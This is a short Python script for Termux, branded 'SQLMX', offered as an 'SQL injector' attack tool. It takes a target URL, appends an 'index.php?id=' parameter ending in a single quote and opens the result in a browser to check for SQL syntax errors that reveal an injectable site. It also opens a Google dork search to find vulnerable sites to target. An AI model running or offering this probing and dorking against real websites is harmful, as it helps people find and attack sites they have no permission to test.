#!/usr/bin/env python
#-*- encoding: utf-8 -*-
import os,webbrowser
#DEVELOPER SCREEN...
def screen():
   os.system("clear")
   print("\u001b[32m")
   print("            ___ __   ______ ____ ____ __  ____  __")
   print("           / __|\ \ / /| _ )|__ (| _ \| \/ |\ \/ /")
   print("           | (__ \ V / | _ \ |_ \| / ||\/| | >  <")
   print("           \___|  |_|  |___/|___/|_|_\|_||_|/_/\_\___")
   print("\u001b[33m")
   print('         《"""""""""""""""""""""""""""""""""""""""""""》')
   print("         《    CYB3RMX_ PROGRAMMING & CYBERSECURITY   》")
   print("         《      ~~~~~MX Security Corporation~~~~~    》")
   print("         《               SQL INJECTOR                》")
   print('         《___________________________________________》')
   print(" ")
#LYNX INSTALLER...
def lynx():
   print("\u001b[36m[!] ALERT THIS PROGRAM NEEDS LYNX BROWSER")
   print("[*] IF YOU ALREADY HAVE SELECT [0]!!")
   lyn=int(input("DO YOU WANNA INSTALL [1/0] ?: "))
   if(lyn==1):
     os.system('pkg install lynx')
     print(" ")
     print("\u001b[32m[*] DOWNLOAD COMPLETED...")
     os.system('sleep 2')
     os.system("clear")
   elif(lyn==0):
     os.system('clear')
   else:
     print("\u001b[31m[*] WRONG OPTION...")
lynx()
screen()
#SQL INJECTION...
def sqlmx():
   print("\u001b[31m///////////////////////////////////")
   print("\u001b[0m ")
   target=str(input("WRITE TARGET URL: "))
   print("\u001b[0m ")
   print("[*] IF YOU SEE A SQL SYNTAX ERROR")
   os.system('sleep 2')
   print("[*] THAT NOTICES YOU A VULNERABILITY")
   print(" ")
   print("\u001b[31m///////////////////////////////////")
   os.system('sleep 2')
   try:
       inject="/index.php?id='"
       webbrowser.open((target+inject))
   except KeyboardInterrupt:
       screen()
       select()
#VULNERABLE DOMAIN DISCOVERY...
def vuln():
   try:
       url='https://www.google.com/search?q=index.php?id='
       webbrowser.open(url)
   except KeyboardInterrupt:
       screen()
       select()
#UPDATE AREA...
def update():
   try:
       print("\u001b[32m[*] UPDATING SQLMX...")
       os.system('sleep 1')
       os.system('git clone https://github.com/CYB3RMX/sqlmx_termux')
       print("\u001b[32m ")
       print("[*] UPDATE COMPLETED...")
       os.system('clear')
   except KeyboardInterrupt:
       print("\u001b[*] UPDATE ABORTED...")
       os.system('sleep 2')
       os.system('clear')
       screen()
       select()
#SELECT PHASE...
def select():
   print("\u001b[31m///////////////////////////////////")
   print("\u001b[0m[1] SQL INJECTOR")
   print("[2] DISCOVER VULN. SITES")
   print("[0] UPDATE SQLMX")
   print(" ")
   choose=int(input("CHOOSE: "))
   print("\u001b[31m///////////////////////////////////")
   print(" ")
   if(choose==1):
     sqlmx()
   elif(choose==2):
     vuln()
   elif(choose==0):
     update()
   else:
     print("\u001b[31m[*] WRONG OPTION...")
#WHOLE PROGRAM IN HERE...
try:
    screen()
    select()
except KeyboardInterrupt:
    print("[*] GOODBYE...")